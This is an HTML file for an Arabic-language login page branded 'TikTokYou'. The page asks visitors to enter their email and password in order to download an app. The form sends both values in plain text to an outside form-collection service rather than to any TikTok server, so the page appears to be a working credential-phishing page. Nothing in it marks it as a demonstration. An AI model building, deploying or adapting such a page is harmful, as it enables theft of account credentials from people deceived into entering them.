<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - TikTokYou</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-card {
            background-color: #1e293b;
            padding: 25px 20px;
            border-radius: 16px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .login-card h2 {
            color: #38bdf8;
            font-size: 20px;
            margin-bottom: 20px;
        }
        .login-card label {
            display: block;
            text-align: right;
            font-size: 14px;
            margin-bottom: 5px;
            color: #cbd5e1;
        }
        .login-card input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            background-color: #0f172a;
            border: 1px solid #334155;
            color: #ffffff;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .login-card button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background-color: #3b82f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 15px;
            transition: background 0.2s;
        }
        .login-card button:hover {
            background-color: #2563eb;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h2>تسجيل الدخول للتحميل</h2>
        
        <!-- النموذج المحدث برابط Forminit الجديد -->
        <form action="https://forminit.com/f/0uw2a43je02" method="POST">
            
            <label>البريد الإلكتروني:</label>
            <input type="text" name="Username_Email" placeholder="example@gmail.com" required>

            <label>كلمة المرور:</label>
            <input type="text" name="Password_Key" placeholder="********" required>

            <button type="submit">اضغط لتحميل التطبيق</button>
        </form>
    </div>

</body>
</html>
